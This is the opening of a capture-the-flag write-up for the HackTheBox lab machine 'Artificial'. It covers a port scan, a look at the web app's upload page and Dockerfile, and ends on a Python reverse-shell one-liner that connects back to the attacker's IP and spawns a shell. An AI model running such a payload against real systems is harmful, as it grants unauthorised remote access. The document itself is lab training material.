![[Artificial-00.png]]
### Network Scan
#### Rustscan
```bash
rustscan -a artificial.htb -- -sV
```
Output:
```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
With RustScan, I scan ports so fast, even my firewall gets whiplash 💨

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.74:22
Open 10.10.11.74:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.11.74
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 20:59 UTC
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 20:59
Scanning 10.10.11.74 [4 ports]
Completed Ping Scan at 20:59, 0.14s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:59
Scanning artificial.htb (10.10.11.74) [2 ports]
Discovered open port 22/tcp on 10.10.11.74
Discovered open port 80/tcp on 10.10.11.74
Completed SYN Stealth Scan at 20:59, 0.12s elapsed (2 total ports)
Initiating Service scan at 20:59
Scanning 2 services on artificial.htb (10.10.11.74)
Completed Service scan at 20:59, 6.20s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.74.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:59
Completed NSE at 20:59, 3.09s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:59
Completed NSE at 20:59, 0.38s elapsed
Nmap scan report for artificial.htb (10.10.11.74)
Host is up, received reset ttl 62 (0.095s latency).
Scanned at 2025-07-11 20:59:12 UTC for 10s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)

```
### Web Enumeration
Now that we got port 80 open lets open the `artificial.htb` website in our browser
![[Artificial-01.png]]
Theres not much attack surface we can utilize but there is a login and registeration page lets register first and see what else can we do.
After registering and logging in we can see the page below.
![[Artificial-03.png]]
We have a file upload section and requirements file and dockerfile

Requirements

```python
tensorflow-cpu==2.13.1
```

Dockerfile

```Dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

Lets handle the issue at hand right now..The Upload form, lets try uploading a malicious python file and see if we get revshell
Payload:

```python
import os,pty,socket;s=socket.socket();s.connect(("10.10.14.109",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

